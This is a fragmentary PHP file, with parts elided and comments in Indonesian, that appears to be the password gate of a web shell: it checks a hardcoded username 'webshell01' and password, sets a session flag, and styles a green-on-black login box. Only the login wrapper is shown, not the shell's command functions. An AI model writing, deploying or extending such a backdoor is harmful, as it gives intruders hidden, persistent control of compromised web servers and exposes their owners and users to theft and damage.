...
// Jika sudah login, langsung tampilkan konten
...
if(isset($_POST['username']) && isset($_POST['password'])){
    if($_POST['username'] == 'webshell01' && $_POST['password'] == 'ZxC7580'){
        $_SESSION['loggedin'] = true;
        header('Location: '.$_SERVER['PHP_SELF']);
        exit();
    } else {
        $error = "Login gagal njing! Username atau password salah.";
    }
}
?>
<!DOCTYPE html>
...
<head>
    ...
    <style>
        ...
        .login-box{background:#111;padding:30px;border-radius:10px;border:1px solid #0f0;box-shadow:0 0 20px #0f0;width:300px;}
